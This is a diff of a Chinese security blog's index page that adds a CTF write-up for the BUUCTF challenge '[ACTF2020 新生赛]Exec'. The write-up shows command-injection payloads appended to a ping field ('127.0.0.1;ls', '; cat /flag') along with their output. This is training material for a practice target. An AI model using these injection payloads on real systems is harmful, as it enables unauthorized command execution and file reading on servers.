@@ -73,6 +73,66 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-BUUCTF-web-第五周" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/08/05/BUUCTF-web-%E7%AC%AC%E4%BA%94%E5%91%A8/" class="article-date">
+  <time class="dt-published" datetime="2023-08-05T11:04:09.000Z" itemprop="datePublished">2023-08-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/08/05/BUUCTF-web-%E7%AC%AC%E4%BA%94%E5%91%A8/">BUUCTF-web-第五周</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><!--mone-->
+
+<h1 id="ACTF2020-新生赛-Exec-1"><a href="#ACTF2020-新生赛-Exec-1" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><h3 id="观察题目"><a href="#观察题目" class="headerlink" title="观察题目"></a>观察题目</h3><p><img src="/2023/08/05/BUUCTF-web-%E7%AC%AC%E4%BA%94%E5%91%A8/image-20230806173745136.png" alt="image-20230806173745136"></p>
+<p>打开靶机后页面如下，是命令执行</p>
+<p>尝试在ping命令后执行其他命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">172.0.0.1;ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/05/BUUCTF-web-%E7%AC%AC%E4%BA%94%E5%91%A8/image-20230806174027379.png" alt="image-20230806174027379"></p>
+<p>没有过滤<code>;</code>和ls</p>
+<p>尝试其他方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">172.0.0.1 | ls</span><br><span class="line"></span><br><span class="line">index.php</span><br><span class="line"></span><br><span class="line">172.0.0.1 &amp; ls</span><br><span class="line"></span><br><span class="line">index.php</span><br><span class="line">PING 172.0.0.1 (172.0.0.1): 56 data bytes</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：172.0.0.1;pwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PING 172.0.0.1 (172.0.0.1): 56 data bytes</span><br><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>
+
+<p>获得当前路径，flag不在当前路径下，查看根目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">输入：172.0.0.1;cd ../../../;ls</span><br><span class="line"></span><br><span class="line">PING 172.0.0.1 (172.0.0.1): 56 data bytes</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
+
+<p>发现flag，查看flag文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">直接输出flag文件</span><br><span class="line">127.0.0.1;cat /flag</span><br><span class="line"></span><br><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">flag&#123;c7e82932-c922-4d3c-87c9-55c1a86b7941&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://monkeyh0ck.github.io/2023/08/05/BUUCTF-web-%E7%AC%AC%E4%BA%94%E5%91%A8/" data-id="clkzas1mo0004aov57btm3g11" data-title="BUUCTF-web-第五周" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-BUUCTF-web-第四周" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/07/29/BUUCTF-web-%E7%AC%AC%E5%9B%9B%E5%91%A8/" class="article-date">
@@ -196,7 +256,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2023/07/29/BUUCTF-web-%E7%AC%AC%E5%9B%9B%E5%91%A8/" data-id="clkp7xfc30003r0v5ht9h4esc" data-title="BUUCTF-web-第四周" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2023/07/29/BUUCTF-web-%E7%AC%AC%E5%9B%9B%E5%91%A8/" data-id="clkzas1ms0008aov5akjqg2j5" data-title="BUUCTF-web-第四周" class="article-share-link">分享</a>
       
       
       
@@ -241,7 +301,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2023/07/22/BUUCTF-web-%E7%AC%AC%E4%B8%89%E5%91%A8/" data-id="clkp7xfbw0000r0v5h292ahhl" data-title="BUUCTF-web-第三周" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2023/07/22/BUUCTF-web-%E7%AC%AC%E4%B8%89%E5%91%A8/" data-id="clkzas1mk0001aov51jgkhxee" data-title="BUUCTF-web-第三周" class="article-share-link">分享</a>
       
       
       
@@ -286,7 +346,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2023/07/14/BUUCTF-web-%E7%AC%AC%E4%BA%8C%E5%91%A8/" data-id="clkp7xfc40005r0v5cj3n6ooq" data-title="BUUCTF-web-第二周" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2023/07/14/BUUCTF-web-%E7%AC%AC%E4%BA%8C%E5%91%A8/" data-id="clkzas1ms000aaov52s6j5jc9" data-title="BUUCTF-web-第二周" class="article-share-link">分享</a>
       
       
       
@@ -331,7 +391,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2023/07/09/BUUCTF-web-%E7%AC%AC%E4%B8%80%E5%91%A8/" data-id="clkp7xfc60009r0v5285ge00m" data-title="BUUCTF-web-第一周" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2023/07/09/BUUCTF-web-%E7%AC%AC%E4%B8%80%E5%91%A8/" data-id="clkzas1mn0003aov5b1k095j5" data-title="BUUCTF-web-第一周" class="article-share-link">分享</a>
       
       
       
@@ -378,7 +438,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/06/01/%E5%8F%8D%E5%BC%B9shell/" data-id="clkp7xfch0017r0v5gmkfbahm" data-title="反弹shell" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/06/01/%E5%8F%8D%E5%BC%B9shell/" data-id="clkzas1n4001iaov558q67dwy" data-title="反弹shell" class="article-share-link">分享</a>
       
       
       
@@ -423,7 +483,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/06/01/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" data-id="clkp7xfcl001tr0v59787ehry" data-title="逻辑漏洞" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/06/01/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" data-id="clkzas1n7001yaov51m525xcr" data-title="逻辑漏洞" class="article-share-link">分享</a>
       
       
       
@@ -468,7 +528,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/03/01/Log4j/" data-id="clkp7xfc8000cr0v5a5ymfez8" data-title="Log4j" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/03/01/Log4j/" data-id="clkzas1mv000gaov5cjg4hpep" data-title="Log4j" class="article-share-link">分享</a>
       
       
       
@@ -520,7 +580,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/03/01/OWASP/" data-id="clkp7xfcb000jr0v5hc2i61il" data-title="OWASP TOP 10" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/03/01/OWASP/" data-id="clkzas1mv000iaov5ceu28dez" data-title="OWASP TOP 10" class="article-share-link">分享</a>
       
       
       
@@ -565,52 +625,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/03/01/kali/" data-id="clkp7xfcg0011r0v58c7k5832" data-title="kali" class="article-share-link">分享</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-web实战篇" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/03/01/web%E5%AE%9E%E6%88%98%E7%AF%87/" class="article-date">
-  <time class="dt-published" datetime="2022-02-28T16:00:00.000Z" itemprop="datePublished">2022-03-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/03/01/web%E5%AE%9E%E6%88%98%E7%AF%87/">OWASP TOP 10</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="黑客攻防技术宝典：web实战篇"><a href="#黑客攻防技术宝典：web实战篇" class="headerlink" title="黑客攻防技术宝典：web实战篇"></a>黑客攻防技术宝典：web实战篇</h1>
-        
-          <p class="article-more-link">
-            <a href="/2022/03/01/web%E5%AE%9E%E6%88%98%E7%AF%87/#more">Read More</a>
-          </p>
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/03/01/web%E5%AE%9E%E6%88%98%E7%AF%87/" data-id="clkp7xfci001br0v52x9r7uli" data-title="OWASP TOP 10" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/03/01/kali/" data-id="clkzas1mz000vaov54pf2afft" data-title="kali" class="article-share-link">分享</a>
       
       
       
@@ -655,7 +670,52 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/03/01/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" data-id="clkp7xfci001dr0v58yi986wx" data-title="缓冲区溢出" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/03/01/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" data-id="clkzas1n3001gaov5ak6p1oqh" data-title="缓冲区溢出" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-web实战篇" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/03/01/web%E5%AE%9E%E6%88%98%E7%AF%87/" class="article-date">
+  <time class="dt-published" datetime="2022-02-28T16:00:00.000Z" itemprop="datePublished">2022-03-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/03/01/web%E5%AE%9E%E6%88%98%E7%AF%87/">OWASP TOP 10</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="黑客攻防技术宝典：web实战篇"><a href="#黑客攻防技术宝典：web实战篇" class="headerlink" title="黑客攻防技术宝典：web实战篇"></a>黑客攻防技术宝典：web实战篇</h1>
+        
+          <p class="article-more-link">
+            <a href="/2022/03/01/web%E5%AE%9E%E6%88%98%E7%AF%87/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://monkeyh0ck.github.io/2022/03/01/web%E5%AE%9E%E6%88%98%E7%AF%87/" data-id="clkzas1n7001xaov52bdecl5b" data-title="OWASP TOP 10" class="article-share-link">分享</a>
       
       
       
@@ -700,7 +760,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/03/01/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/" data-id="clkp7xfcl001rr0v511448sdz" data-title="面试情况记录" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/03/01/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/" data-id="clkzas1n80020aov51zbeggno" data-title="面试情况记录" class="article-share-link">分享</a>
       
       
       
@@ -748,7 +808,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/02/01/JAVA/" data-id="clkp7xfc50008r0v5ek1qajeq" data-title="JAVA" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/02/01/JAVA/" data-id="clkzas1mu000daov5dhvo7lqz" data-title="JAVA" class="article-share-link">分享</a>
       
       
       
@@ -805,7 +865,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/01/01/AST/" data-id="clkp7xfc00001r0v51e8nekkh" data-title="AST" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/01/01/AST/" data-id="clkzas1mf0000aov54uo726k5" data-title="AST" class="article-share-link">分享</a>
       
       
       
@@ -861,7 +921,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/01/01/JavaScript-reverse/" data-id="clkp7xfc9000er0v57uhx2ucu" data-title="JavaScript-逆向" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/01/01/JavaScript-reverse/" data-id="clkzas1mt000caov56aru5m4m" data-title="JavaScript-逆向" class="article-share-link">分享</a>
       
       
       
@@ -908,7 +968,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/01/01/%E6%9E%81%E9%AA%8C%E6%BB%91%E5%9D%971/" data-id="clkp7xfch0019r0v5c5yg7bm7" data-title="极验滑块" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/01/01/%E6%9E%81%E9%AA%8C%E6%BB%91%E5%9D%971/" data-id="clkzas1n4001kaov5a5d3abvx" data-title="极验滑块" class="article-share-link">分享</a>
       
       
       
@@ -953,52 +1013,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/12/01/XSS/" data-id="clkp7xfcc000mr0v50i663apj" data-title="XSS" class="article-share-link">分享</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-webSecurity" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/12/01/webSecurity/" class="article-date">
-  <time class="dt-published" datetime="2021-11-30T16:00:00.000Z" itemprop="datePublished">2021-12-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/12/01/webSecurity/">webSecurity</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="webSecurity"><a href="#webSecurity" class="headerlink" title="webSecurity"></a>webSecurity</h1>
-        
-          <p class="article-more-link">
-            <a href="/2021/12/01/webSecurity/#more">Read More</a>
-          </p>
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/12/01/webSecurity/" data-id="clkp7xfci001fr0v5b073430x" data-title="webSecurity" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/12/01/XSS/" data-id="clkzas1mw000laov58ho12m32" data-title="XSS" class="article-share-link">分享</a>
       
       
       
@@ -1043,7 +1058,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/12/01/networkSecurity/" data-id="clkp7xfcl001qr0v57ycx5521" data-title="网络安全训练营" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/12/01/networkSecurity/" data-id="clkzas1n10014aov59f73ejif" data-title="网络安全训练营" class="article-share-link">分享</a>
       
       
       
@@ -1057,10 +1072,10 @@
 
 
   
-    <article id="post-burp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-webSecurity" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2021/11/01/burp/" class="article-date">
-  <time class="dt-published" datetime="2021-10-31T16:00:00.000Z" itemprop="datePublished">2021-11-01</time>
+    <a href="/2021/12/01/webSecurity/" class="article-date">
+  <time class="dt-published" datetime="2021-11-30T16:00:00.000Z" itemprop="datePublished">2021-12-01</time>
 </a>
     
   </div>
@@ -1071,7 +1086,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/11/01/burp/">burpsuite</a>
+      <a class="p-name article-title" href="/2021/12/01/webSecurity/">webSecurity</a>
     </h1>
   
 
@@ -1079,16 +1094,16 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h1>
+        <h1 id="webSecurity"><a href="#webSecurity" class="headerlink" title="webSecurity"></a>webSecurity</h1>
         
           <p class="article-more-link">
-            <a href="/2021/11/01/burp/#more">Read More</a>
+            <a href="/2021/12/01/webSecurity/#more">Read More</a>
           </p>
         
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/11/01/burp/" data-id="clkp7xfcc000or0v54oeudy8i" data-title="burpsuite" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/12/01/webSecurity/" data-id="clkzas1n20018aov5cmi20e0g" data-title="webSecurity" class="article-share-link">分享</a>
       
       
       
@@ -1139,7 +1154,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">七月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">八月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">七月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li></ul>
     </div>
   </div>
 
@@ -1150,6 +1165,10 @@
     <h3 class="widget-title">最新文章</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2023/08/05/BUUCTF-web-%E7%AC%AC%E4%BA%94%E5%91%A8/">BUUCTF-web-第五周</a>
+          </li>
         
           <li>
             <a href="/2023/07/29/BUUCTF-web-%E7%AC%AC%E5%9B%9B%E5%91%A8/">BUUCTF-web-第四周</a>
@@ -1165,10 +1184,6 @@
         
           <li>
             <a href="/2023/07/09/BUUCTF-web-%E7%AC%AC%E4%B8%80%E5%91%A8/">BUUCTF-web-第一周</a>
-          </li>
-        
-          <li>
-            <a href="/2022/06/01/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
           </li>
         
       </ul>
